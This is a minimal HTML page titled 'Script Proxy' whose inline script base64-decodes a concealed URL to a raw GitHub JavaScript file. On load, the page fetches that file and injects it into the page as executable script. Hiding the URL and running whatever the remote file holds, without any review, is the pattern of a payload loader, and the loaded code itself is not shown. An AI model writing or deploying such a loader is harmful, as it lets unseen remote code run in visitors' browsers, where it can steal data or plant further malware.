<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Script Proxy</title>
  <script>
    const base64EncodedURL = "aHR0cHM6Ly9yYXcuZ2l0aHViY29udGVudC5jb20vbHR0MjAzL3h1bmppYW4vbWFpbi9jb250ZW50Lmpz";
    const decodedURL = atob(base64EncodedURL);

    
    fetch(decodedURL)
      .then(res => res.text())  
      .then(script => {
        const s = document.createElement('script');
        s.textContent = script;  
        document.head.appendChild(s);  
        console.log('Script injected!');
      })
      .catch(console.error);  
  </script>
</head>
<body>
  <h1>Script Proxy Page</h1>
</body>
</html>
